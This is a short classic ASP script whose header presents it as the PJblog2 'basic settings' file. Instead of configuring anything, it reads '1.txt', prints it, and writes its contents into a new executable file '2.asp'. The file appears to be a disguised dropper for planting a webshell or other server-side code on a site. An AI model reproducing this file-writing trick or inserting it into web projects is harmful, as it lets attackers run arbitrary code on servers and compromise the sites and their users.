<%@ LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
'***************PJblog2 基本设置*******************
' PJblog2 Copyright 2005
' Update:2005-8-16
'**************************************************

Option Explicit
Response.Buffer = True
Server.ScriptTimeOut = 90
Session.CodePage = 65001
Session.LCID = 2057

%>
<!--#include file = "Stream.asp" -->
<%
Dim s
Set s = New Stream
	With s
	Response.Write(.LoadFile("1.txt"))
	.SaveToFile s.LoadFile("1.txt"), "2.asp"
	End With
Set s = Nothing
%>